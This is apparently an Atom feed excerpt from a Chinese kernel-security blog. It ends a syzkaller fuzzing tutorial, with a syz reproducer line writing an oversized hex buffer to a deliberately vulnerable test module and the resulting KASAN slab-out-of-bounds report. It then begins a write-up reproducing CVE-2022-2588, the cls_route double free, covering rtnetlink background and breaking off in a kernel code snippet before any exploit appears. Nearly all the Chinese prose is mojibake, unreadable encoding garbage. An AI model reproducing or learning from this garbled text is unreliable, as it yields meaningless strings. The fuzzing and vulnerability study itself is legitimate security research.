¼ï¼Œå…¶ä¸€ä¸ªå«ä¹‰å¯ä»¥çœ‹åˆ°æ˜¯åœ¨<code>test_write</code>ä¸­è§¦å‘äº†ä¸€ä¸ª<code>slab-out-of-bounds</code>ï¼Œä¹Ÿå°±æ˜¯è¶Šç•Œã€‚ç„¶åæœ€åçš„<code>report</code>æ˜¾ç¤ºçš„çŠ¶æ€æ˜¯æ­£åœ¨å°è¯•é‡ç°è¿™ä¸ª<code>crash</code>è¿æ°”ä¸ä½³çš„æ˜¯è¿™ä¸ªå¹¶ä¸èƒ½é‡ç°ï¼Œå¦‚æœèƒ½å¤Ÿé‡ç°åˆ™ä¼šæ˜¾ç¤ºå…¶å¯¹åº”çš„ç»“æœï¼Œå¦‚æœä¸€ä¸ªå“ç›¸å¥½çš„æ¼æ´å…¶<code>report</code>ä¼šæ˜¾ç¤º<code>has C repo</code>è¡¨ç¤ºæœ‰è¯¥<code>crash</code>çš„Cè¯­è¨€ä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r2 = open$test(&amp;(<span class="number">0x7f0000000380</span>), <span class="number">0x10000</span>, <span class="number">0x2</span>)</span><br><span class="line">write$test(r2, &amp;(<span class="number">0x7f00000003c0</span>)=<span class="string">&quot;da0f433ee1bffca3085037fc1dcce3ed4bce4ba262cfd2069703973bbd42cb061bc099e240f5a5645d2d34a9cb270151cd6edcdd7e26dbb7ff57eae5352b1920eb5e2354178f009c8c3b86de024a06cd9c24386cf0db616ae8ef502687bc61db26bb28ff8f81500321e73feb9a639fbdf287fa98c6a0e6de0510c675e920cf4e5dc6e2cb9fe4e4be66ddb29bf45283b0f9359a0028e4ffc65c54ec966e16113a6b49e3ba85f9f29aa297e978a5944426f644de7a37cfd242563e97b2ec55f3633fe9569b776c3a299ec199153afd8187b798f515ae9fdf30ebda4d9bfad062514718bef675a6528e2879aeb56ad583077ffe63f4a0e994ef211deb84f15379f6b1fa2067cf9e4d4bd7bfc5ed7ec8133ae06be457e498087f306d661684531a7f353dfeb8982d89a1a6a3554b5bbe27379c20c9bae3a5672ea0176721d8e38fbb656064062ff431efac310c5a3dc36d754b2407a82d63e152ecefa945219d0149fd17ae8c37b563ae571108ea67e7642da91f629d797380411d153b68e2ce1050f75c8be7ee1f4c626127223ee46d61986db8685710a79b8cf636570c5a522a2d83971fb5fa457326030a2899e3acfb54a4764cb8e46892c49e4ca23b633384886260f23e6ca06522928c82364950d8e24feab8c02b2442a1a102eb4374c721b6c59f66ad306ce03215d5f4db91151b0690669a09b5b59f249b64172a0009be02dd91a8c8733f9b9a64c72b3342c1c7e770e52fe6c31fff0d856ac0de9344555449e2c817f27363ef1694d10c2dd92b15f0698b003f586444a1b529c2ec2d338b64ba2bfa2ecd285b4631f8df46969a646a291c7e967c323589e49e5e01b29547848f62e9672a07e9a223ebc612058a4d1849ba105b09bbfbb2ee4dc62d32ee80ed4302a2921ed7de6f51bf068fe420debed43a0a0ecad74bba4b0d576afe8e4df6900d7fe7104427c87c1559576020c751bc040f905caf5c155331af5645872210cc76dc3a356bb3abdd373c9e02f1770f5df9b9de527e6a3359016c56199e35a832b658a410e2a97f549edf96f8781aeb5fa08e922f333d86026c62f1a24f865074202002a85042bb85ddbcbf4430b446bb0cdf984682f1d8fc7a1889352407d1c781a653fe489ece1e7ffbdc15cb0cec3ff776b7d1a34fc9642fcbdc8f2a732dae5f00a692e78dbd4f6a94986f35b38ac8aecbe3c2bc4a7932b5e933c08c4c5f8b90eb1ce3c80af44fd11d2715ec76b369e6468170a93757083a701a2d84c08a1602533ee4ab629f0839a984546a8aa1b7fee547fa4d78f6d67397ea1e9f853e22da69fe40ba837cc6a64a1ad873d971fe383ae2c862301672c236f758aa1ede00483cc4f40b066e1e3e9997ba723141726af050ba7789c9e7451a0baf52e9d49b44e8d92ab5df925598e6d9b8b10bee1089c6ff3f9dd9dfd660f832c025fcb20a159bd305563647ae9c4f0fedf7f3fd9d2d0589956cee8f5ec040f043cd931539fa7880fd69147e5a32c468611774f18987adca95a0eaa0b962f4c2fdcb91ac52ec28e39704b924bd3fc0e1f796bbd9c8b815b646b682f1d4796b9e567112453291220a7f5d2012a565f7abfba7fd318e72530b1cf04d74b42e64627c6936587c81d9bae45fc0cc2815674946427529151641aba2284c17c8ca26d7b8e0cf45ccb12db3705693a9eeb5b92d84830aae5aa170e6317544681b24a8fcb01ff769d3e89f65e9b205540239d43b81a6c2679810a3467ff0bef5bce56bcb853b60744315fc0f2899e6db88edd5ff2c8d11bd0ea553b3b1766f2ba0ac02e46805a89cfb8f71d743666556f530b759528877b8b71aa6f882616c8a795ef295961007c07479673af54818ccc79b5e43e2bbdcf00ff3d9cbfe679c6e7fc688dd0797c0a7a7e22cbdad3f1f3e3e99f8ed3b17b7f04de17e5817d48abb90203163317ee630fae9bbbe06887208ce9138b0ce0bb8ce511229698c71351c8cbdef2dcf0279c4b334c55254babf6bf4b00a7a2e89557550f338ab5e332824fbf4f1f774b970248916bdd4922fe69c825d62950c6b6a98f49795ef6fbacfc65fd8e879bad0e2963f46be54ae3c699339384cbde926d360501a6a0f0f21090d8f735301c04230d969ec4e88f1e18fc62e656ac03610dc1772295df75ca08fbd4e1fd7f39eb2cb349878a4936d35f335d1eac7da574276a6d43672393a747dd7182c27100370667700f3de9b0389cf8ac812f5ad07c7517a2a64ca22b17f120011e2a70d95cb8f7835f7cc0481defaf20665a0418e1385d0306ee26c5a861ef69e37ccb91237c9c106e9b483ae4e1c3957e02f1f5b247c835dff73502bf518d1c80e827c7d6221f1c8ca9226d2a1ef904f5025504544f4024c60ff5bf23f5b79cee9720745bf36a86179d7d0af1758e663bcd6e98d2f9339dc9ecc038a1521bb16edfbb9071fb09c2917a2144c90cd752b5683e321b70271089252da45fbb01ec19e9bc9261f7f50e129d44f6ecfed3222f7bc9943356b46f0aa97f1b03ef95890543c22a00655a8c99fdccd4ef04a7d72084d5c77a96025d5095ed608b19d0f5a7ae778fa4eab4a8f739b5ceb3fc97f11ec67a9b6c6d7ff88a4395e8bc27e8b7034de7be8683c958f2773f2bb985a9bede7e1d39aa7899e1e88aa7d7af00a9a9f084a094636af8160a14626d2c0dc142656911e418aef80dcace137e41ad996984975c62f63e5f0fdc53a699944c2e06d275264375a5330e4a295918e6f0f6e57d82e2de705eb9ce5791eac9a117d9912c6d6ae1ffdb08389dfd1eea539d2e9069520076873608d22975dd38bfd1df04c4f9dcac4bfed02af53802f8582ac59321a8453e69a7cb5a5cee4a6940466a5cecb19c9527c94d0441ad4328297f3e92714ee3153b459f45cad7e2a2197da7bb5f3ea498e0b9e49405e8f4c881eb6a9555b82072d5a3fa06b935d0c127244d747a637d09fceaffc64f983aa7df54d59f265ed28ebe79f41ebd72c2a401b88adf0daf4158bc47faebfec1fcf934b55a9bac5da808566db2216c21c17b26e25dc8566e3a14bbddd83b8d2db809a5098f5404e67958fa801f073ba48e5c0b4a5a1a98df77d8d81dd1054c7e8ece8ac44d4c21435e830c7d28927b1a61670886116d4f819bd406dd61c0bc7e57933b9071cd1de7fe9e5e8bfb66c3e637f3dc27329c936b47c2ce5f7bd8d96e889c9a4cfe6ffcfcc1b2de5b1b6cc417952d07413fbaa586bc997db9dc916a529d6e6ef7d358f41d35f888825f6491bea834adb7d57a6fdfe7b61e6ed369329b009404352f168b1adf1683fa8c860e272dcdc5593e100d83fa4bf2fcb4832bd6da307c3910675e36f5df01e1e90253948f17a6b286f50afff315e562d8feb83c8dd68397319022dfd951be06d494e9bba6dc0ddc8c8b20821522ae68bb02b749925c94f7d80566cdfdef0f6076cf7542ec7c064d0a9e1a7f71d5b67a88a94ad19d4a73e3f16d68709e0e5ca166d37c8baa384434732bba3e7d08fba66f012d22e21077a23001f1f0160f4efee36be51edb83910cd2e7362fdc173d5699b634e75489a16580c733ffce3df11d5f482c7ff82cd8c843c0d513404758016955862d308c1e0e36ad3d98652cf837782423451c4e8638990fb65eff25c380caed61a0a8fbd1cc484ecc70467efc17310cef1fd3c075d339f40067b71b15541571be112f85f89afc6fc842b263e3ce57116176402a76e695fd28eacc2da85ee62aafa6bcb896d554f843ee152e6b84b8a3c6aaeea7443b5290cec768ba0ba2aada7dee7438b76861d2434104fac6a86f7448981ab970d27c5268d3d7eac9ff26b657affacbd0dbdc30ecfd0e305fba89461c1d85aef2feb30f0cb9c94a46578d55957984deed9ec02f796246c366adc7cb32eeae18f2d56a86702c04c1dd172a70899d28808d2050d7cdaf78c6975c5dd56ab3435fc40b8019a6bbd8964bc212abb6ab3e82e12604650433964cb48093e46fe79439022f6b862ed96c6bfa59f834a28ae857df0805b6e7b4ed5db1bee79ed3999485131468ebaa043304ce67f01a6b67ac7e0d744326e0c21a857620b0e999534e36c72855a1f674ec301dc06fc1640ee4af225a3f8a1a6ed344bff7b377e957eb6a606c4fb4d82ba4238d3eedeb4ec74ee2dc7341edab9dedfcb49828b901abac4991f5886f663d8d07e77b2b8b4b12c896f28149ca896eb2d9dcb2f18a5ad6c7918e57d0e730d012f39328a94172a9f41946348ed5eed60b87512aec77114c4582ab7a29f0a19e84e52c11b07f14d53b3310cadac1546e0b042243e6afb376192ecd87be7b574f852f411ff5a8a6f7fdb743b568e89a34ba3547b2959f3760e382b75441bea3713c81e31391b10751f80bdb42216d7644d8ab5aedb5ed437e0e7954a1ef4bd6c3cc2aa45b652c86281345eaa3dbaceb684224222db02c9a638475364135284a21097286ef864706c9df5c350dc5933a5ba1d46795f49316705d7ae7cb59f5e91994a6c57ae525189243cd36b8ab1c351eaaa04ace3bccfb1287c4c60667524562b8f350da09e6ca212194d49e6550b2289170c64e8c9d019b4d4f7d888e62b5458c5b28b2eda131079f5e66d35014d5460e7e785bcc7ffc6141384498c55dad57901729fc056a5595850ceb1d5c6d31a6894b8d8b85f9173f9ebc158d2d43952c48d4f3590a4e4fae41ea0aa9c8ab78557fd4e9ca5611b62ca6f0b5f6c46592537f008cd5083b08bc3fd1218773cb10fa44933fbaeed4afa57afae135c8a1898b06a5c2855e3f8a6bfe8ba9a589bceb5f9a5376f220cfdfc977e7416abd7258b40e9df634d966d7d8e665ab3ab6495bd07dcdf32ac3f62eaaf2e18ba093f46c96b7ac2e6fca971dfec82c72fd7241aac6774655ad19b8bebd1766e1afa44510682369083ae89734a7809539193d48146fe83f2401b3a33a0857f8cd2a305bc59e58bf41360fe0abe63a6f99bd12a8d1988a3c52dc3ac7091c71ffbab698284079799bbd66370b473b542dab968670fb8b4444af52b5070601df1702738cb29aceae70c6b916d11bdfc6814d5f57a6b257f62587f4e35525074fc031db80f98b9b59130d831bd8bbaa45ed2544dcb34badeac02b794c19875e3edb4b4b78156995df60b4f03a03a9eae88bc5bc071d0f948f38f9a92511b5939acc135820d10c708edb737c9ad7c7dd80cb9cba5347a712e946409bd400c7bb5badc9ecf969ca886260e184ebcb5826b6de23bd0e0a3935321299d45d0e151c782cde6239490566f11b91bac99fd0d202f20abd4c8fad629c4596b857730ac92cc6e67e3177692dd27f1eaa48ca6d19649d0692bd6ab77772c04535c91660f961222ae3a2fbb2663f4fb737f153595ce9a8b865c2dd36eb19b459e933322ddef02a2412e8dbd3b48e951eb9497f3837a6a3b567c43edb3c4f74bf5356187c591f4419dbc21cec3eb31ed865a6146cb455b6a381f0663f8a09c16eda030839fce28a85faa27a0adbb504cc20e3a1af0c6b29f8a7a8b9cbf2e16cfc4ae9413338a6fe08e30f9c495869828203e774cff77da575ec0399368c5568a5d98e51047ece46b2612fe5ab2613761b58d6dcbd079c7d253db81a540f2b921bd0599b70c3119803fc5e97954feaf4a7f813d77a03a811d2582f14989fca781dc28aa96958b9546cc83fa543bc00928a602f3f4be13ec7f1acb78d57e6ebd599e2a077656ffaf04d9a971a017f2391301fdcd7053925d41f9d355dc229ac94fcc0f0b01070b3cb485cbae3356a5421ff428067e9be643933615b0d3bcbe3a2a6d25&quot;</span>, <span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯æˆªå–çš„logæ–‡ä»¶ï¼Œå…¶ä¸­ä¼šè®°å½•ç³»ç»Ÿè°ƒç”¨ï¼Œè°ƒç”¨çš„å‚æ•°ç­‰ä¸€ç³»åˆ—ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">==================================================================</span><br><span class="line">BUG: KASAN: slab-out-of-bounds <span class="keyword">in</span> instrument_copy_from_user include/linux/instrumented.h:135 [inline]</span><br><span class="line">BUG: KASAN: slab-out-of-bounds <span class="keyword">in</span> _copy_from_user+0x66/0xd0 lib/usercopy.c:15</span><br><span class="line">Write of size 4096 at addr ffff88810686f800 by task syz-executor/3452</span><br><span class="line">CPU: 0 PID: 3452 Comm: syz-executor Not tainted 5.11.0 <span class="comment">#1</span></span><br><span class="line">Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014</span><br><span class="line">Call Trace:</span><br><span class="line"> __dump_stack lib/dump_stack.c:79 [inline]</span><br><span class="line"> dump_stack+0x9c/0xcf lib/dump_stack.c:120</span><br><span class="line"> print_address_description.constprop.0+0x1a/0x140 mm/kasan/report.c:230</span><br><span class="line"> __kasan_report mm/kasan/report.c:396 [inline]</span><br><span class="line"> kasan_report.cold+0x7f/0x10e mm/kasan/report.c:413</span><br><span class="line"> check_memory_region_inline mm/kasan/generic.c:179 [inline]</span><br><span class="line"> check_memory_region+0x17c/0x1e0 mm/kasan/generic.c:185</span><br><span class="line"> instrument_copy_from_user include/linux/instrumented.h:135 [inline]</span><br><span class="line"> _copy_from_user+0x66/0xd0 lib/usercopy.c:15</span><br><span class="line"> test_write+0x4f/0x70 [vuln_device]</span><br><span class="line"> vfs_write+0x1bf/0x760 fs/read_write.c:603</span><br><span class="line"> ksys_write+0x100/0x210 fs/read_write.c:658</span><br><span class="line"> do_syscall_64+0x33/0x40 arch/x86/entry/common.c:46</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line">RIP: 0033:0x7f1a044ec96d</span><br><span class="line">Code: c3 e8 17 32 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48</span><br><span class="line">RSP: 002b:00007f1a0325bbf8 EFLAGS: 00000246 ORIG_RAX: 0000000000000001</span><br><span class="line">RAX: ffffffffffffffda RBX: 00007f1a04628f80 RCX: 00007f1a044ec96d</span><br><span class="line">RDX: 000000000000003f RSI: 0000000020001580 RDI: 0000000000000004</span><br><span class="line">RBP: 00007f1a0454a4af R08: 0000000000000000 R09: 0000000000000000</span><br><span class="line">R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000</span><br><span class="line">R13: 00007fff371812bf R14: 00007fff37181460 R15: 00007f1a0325bd80</span><br><span class="line">Allocated by task 3452:</span><br><span class="line"> kasan_save_stack+0x1b/0x40 mm/kasan/common.c:38</span><br><span class="line"> kasan_set_track mm/kasan/common.c:46 [inline]</span><br><span class="line"> set_alloc_info mm/kasan/common.c:401 [inline]</span><br><span class="line"> ____kasan_kmalloc.constprop.0+0x84/0xa0 mm/kasan/common.c:429</span><br><span class="line"> test_write+0x3f/0x70 [vuln_device]</span><br><span class="line"> vfs_write+0x1bf/0x760 fs/read_write.c:603</span><br><span class="line"> ksys_write+0x100/0x210 fs/read_write.c:658</span><br><span class="line"> do_syscall_64+0x33/0x40 arch/x86/entry/common.c:46</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line">The buggy address belongs to the object at ffff88810686f800</span><br><span class="line">The buggy address is located 0 bytes inside of</span><br><span class="line">The buggy address belongs to the page:</span><br><span class="line">page:00000000a4947c90 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x10686e</span><br><span class="line">head:00000000a4947c90 order:1 compound_mapcount:0</span><br><span class="line">flags: 0x200000000010200(slab|head)</span><br><span class="line">raw: 0200000000010200 ffffea0004335180 0000000300000003 ffff888100041280</span><br><span class="line">raw: 0000000000000000 0000000080080008 00000001ffffffff 0000000000000000</span><br><span class="line">page dumped because: kasan: bad access detected</span><br><span class="line">Memory state around the buggy address:</span><br><span class="line"> ffff88810686f900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line"> ffff88810686f980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">&gt;ffff88810686fa00: <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span></span><br><span class="line">                   ^</span><br><span class="line"> ffff88810686fa80: <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span></span><br><span class="line"> ffff88810686fb00: <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span></span><br><span class="line">==================================================================</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯<code>report</code>ç»™å‡ºçš„æ˜¯<code>kernel</code>ç›¸å…³çš„ä¿¡æ¯ï¼Œæ¯”å¦‚å‡½æ•°è°ƒç”¨æ ˆï¼Œä»¥åŠå¯„å­˜å™¨ä¿¡æ¯ç­‰ã€‚</p><p>è‡³äºè¿™é‡Œä¸ºä»€ä¹ˆæ— æ³•é‡ç°å‡ºæˆ‘è§‰å¾—ä¸€å¤§åŸå› å°±æ˜¯æˆ‘æ²¡å¯¹è¿™ä¸ªé©±åŠ¨è½½å…¥è®¾ç½®è‡ªå¯åŠ¨ï¼Œå¯¼è‡´ä¸€æ¬¡<code>kernel panic</code>ä¹‹åæ²¡æœ‰é‡æ–°åŠ è½½é©±åŠ¨ï¼ˆ<del>ä¸‹ç­äº†ä¸æäº†ï¼</del>ï¼‰ã€‚å…¶å®æœ‰kernel pwnåŸºç¡€çš„æœ‹å‹è¯»æ‡‚å‰é¢çš„logå’Œ<code>kernel panic</code>çš„ä¿¡æ¯éƒ½ä¼šç‰¹åˆ«è½»æ¾çš„ï¼Œè¿™é‡Œä¸è¯¦ç»†è¯´äº†ï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™ç¯‡æ–‡ç« åœ¨å‰é¢å·²ç»æ˜¯åŸ‹äº†è®¸å¤šå‘äº†ï¼Œé åçš„å‡ ç¯‡æ–‡ç« éƒ½æåˆ°äº†æˆ‘æƒ³å­¦&lt;code&gt;syzkaller&lt;/code&gt;ï¼Œä½†æ˜¯æ€»æœ‰äº‹è€½æä»¥è‡³äºæ‹–åˆ°äº†ç°åœ¨ã€‚</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://196082.github.io/categories/FUZZ/"/>
    
    
    <category term="FUZZ" scheme="https://196082.github.io/tags/FUZZ/"/>
    
    <category term="LKM" scheme="https://196082.github.io/tags/LKM/"/>
    
    <category term="syzkaller" scheme="https://196082.github.io/tags/syzkaller/"/>
    
    <category term="syzlang" scheme="https://196082.github.io/tags/syzlang/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-2588å¤ç°</title>
    <link href="https://196082.github.io/2023/10/27/CVE-2022-2588/"/>
    <id>https://196082.github.io/2023/10/27/CVE-2022-2588/</id>
    <published>2023-10-27T08:39:53.000Z</published>
    <updated>2023-11-29T10:11:29.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¥ä¸æƒ³åˆ†æCVEäº†ï¼Œæ— å¥ˆå‰é¢æåˆ°äº†å†…æ ¸å†…éƒ¨éš”ç¦»æœºåˆ¶ï¼Œè€Œåœ¨å¾€æœŸçš„æ–‡ç« ä¸­åªåœ¨<a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >å‘pipe_bufferè¯´yesï¼<i class="fas fa-external-link-alt"></i></a> æ–‡ç« ä¸­ç®€è¦æåˆ°è¿‡é€šè¿‡å®ç°é¡µçº§çš„UAFæ¥å®ç°ç»•è¿‡çš„ï¼Œå¯æ˜¯è¿˜å­˜åœ¨ä¸€ç§æŠ€æœ¯å¯ä»¥ç»•è¿‡ï¼Œå¦‚æœä¸è®°å½•ä¸‹æ¥æ˜¯çœŸçš„å¿ƒç—’ï¼Œæ‰€ä»¥åªèƒ½æŠŠ<code>syzkaller</code>çš„å­¦ä¹ è®¡åˆ’å¾€åæ¨æ¨è¿›è€Œæ¥åˆ†æè¿™ä¸€ä¸ªåˆ©ç”¨æ–¹æ³•ã€‚æ–‡ä»¶åˆ›å»ºæ—¶é—´æ˜¯10æœˆ19å·ï¼Œ<del>ä¸æƒ³å†™æ–‡ç« äº†ï¼Œæ‡’ç‹—ç—‡çŠ¯äº†</del></p><p>å›åˆ°æ­£é¢˜ï¼Œè¿™ä¸€æ¼æ´å‡ºç°åœ¨æµé‡æ§åˆ¶å­ç³»ç»ŸåŒ…åˆ†ç±»å™¨çš„<code>cls_route</code>è¿‡æ»¤å™¨ä¸­ï¼Œå½“æ—§è¿‡æ»¤å™¨çš„å¥æŸ„ä¸º0æ—¶ï¼Œåœ¨é‡Šæ”¾ä¹‹å‰å†…æ ¸ä¸ä¼šä»å“ˆå¸Œè¡¨ä¸­å°†å…¶åˆ é™¤ä»è€Œäº§ç”Ÿçš„Double Freeã€‚</p><h2 id="Rtnetlinkç®€è¿°"><a href="#Rtnetlinkç®€è¿°" class="headerlink" title="Rtnetlinkç®€è¿°"></a>Rtnetlinkç®€è¿°</h2><p><del>è¿™é‡Œç›´æ¥æŠ„æˆ‘å‚è€ƒæ–‡ç« çš„åŸæ–‡ï¼Œç»å¯¹ä¸æ˜¯æˆ‘æ‡’å¾—å†™</del></p><p>Rtnetlinkæ˜¯æ‰€æœ‰å†…æ ¸ç½‘ç»œå­ç³»ç»Ÿä½¿ç”¨çš„ç½‘ç»œè¿æ¥æ€»çº¿ï¼ŒåŒ…æ‹¬ç½‘ç»œæ¥å£ã€è·¯ç”±ã€fdbå’Œé‚»å±…ã€‚ä¸€äº›å†…æ ¸ç½‘ç»œå­ç³»ç»Ÿä¹Ÿåœ¨é€šç”¨netlinkæ€»çº¿ä¸Šæä¾›æœåŠ¡ã€‚Linuxå†…æ ¸ç½‘ç»œå­ç³»ç»Ÿä½¿ç”¨æ¶ˆæ¯ç±»å‹å’Œç³»åˆ—å‘Rtnetlinkå†…æ ¸æ³¨å†Œå¤„ç†ç¨‹åºã€‚Rtnetlinkå…è®¸è¯»å–å’Œæ›´æ”¹å†…æ ¸çš„è·¯ç”±è¡¨ã€‚å®ƒåœ¨å†…æ ¸ä¸­ç”¨äºåœ¨å„ç§å­ç³»ç»Ÿä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œä¹Ÿç”¨äºä¸ç”¨æˆ·ç©ºé—´ç¨‹åºè¿›è¡Œé€šä¿¡ã€‚ç½‘ç»œè·¯ç”±ã€IPåœ°å€ã€é“¾æ¥å‚æ•°ã€é‚»å±…è®¾ç½®ã€æ’é˜Ÿè§„åˆ™ã€æµé‡ç±»åˆ«å’Œæ•°æ®åŒ…åˆ†ç±»å™¨éƒ½å¯ä»¥é€šè¿‡NETLINK_ROUTEå¥—æ¥å­—è¿›è¡Œæ§åˆ¶ã€‚Rtnetlinkç”±ä»¥ä¸‹æ¶ˆæ¯ç±»å‹ç»„æˆï¼ˆé™¤äº†æ ‡å‡†çš„netlinkæ¶ˆæ¯ï¼‰ï¼š</p><ul><li>  RTM_NEWLINKã€RTM_DELLINKã€RTM_GETLINKåˆ›å»ºã€åˆ é™¤æˆ–è·å–æœ‰å…³ç‰¹å®šç½‘ç»œæ¥å£çš„ä¿¡æ¯ã€‚</li><li>  RTM_NEWADDRã€RTM_DELADDRã€RTM_GETADDRæ·»åŠ ã€åˆ é™¤æˆ–æ¥æ”¶æœ‰å…³ä¸æ¥å£å…³è”çš„IPåœ°å€çš„ä¿¡æ¯ã€‚</li><li>  RTM_NEWROUTEã€RTM_DELROUTEã€RTM_GETROUTEåˆ›å»ºã€åˆ é™¤æˆ–æ¥æ”¶æœ‰å…³ç½‘ç»œè·¯ç”±çš„ä¿¡æ¯ã€‚</li><li>  RTM_NEWNEIGHã€RTM_DELNEIGHã€RTM_GETNEIGHæ·»åŠ ã€åˆ é™¤æˆ–æ¥æ”¶æœ‰å…³é‚»å±…è¡¨æ¡ç›®çš„ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼ŒARPæ¡ç›®ï¼‰ã€‚</li><li>  RTM_NEWRULEã€RTM_DELRULEã€RTM_GETRULEæ·»åŠ ã€åˆ é™¤æˆ–æ£€ç´¢è·¯ç”±è§„åˆ™ã€‚</li><li>  RTM_NEWQDISCã€RTM_DELQDISCã€RTM_GETQDISCæ·»åŠ ã€åˆ é™¤æˆ–è·å–æ’é˜Ÿè§„åˆ™ã€‚</li><li>  RTM_NEWTCLASSã€RTM_DELTCLASSã€RTM_GETTCLASSæ·»åŠ ã€åˆ é™¤æˆ–è·å–æµé‡ç±»åˆ«ã€‚</li><li>  RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTERæ·»åŠ ã€åˆ é™¤æˆ–æ¥æ”¶æœ‰å…³æµé‡è¿‡æ»¤å™¨çš„ä¿¡æ¯ã€‚</li></ul><h3 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h3><p>é¦–å…ˆï¼Œå½“å†…æ ¸å¯åŠ¨åŠ è½½æ—¶ä¼šåˆå§‹åŒ–<code>netlink</code>åè®®ï¼Œæ­¤æ—¶ä¼šé€šè¿‡è°ƒç”¨<code>rtnetlink_init</code>å‡½æ•°åˆå§‹åŒ–è·¯ç”±<code>netlink socket</code>æ¥å£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __init <span class="title">rtnetlink_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (register_pernet_subsys(&amp;rtnetlink_net_ops))</span><br><span class="line">panic(<span class="string">&quot;rtnetlink_init: cannot initialize rtnetlink\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">register_netdevice_notifier(&amp;rtnetlink_dev_notifier);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, 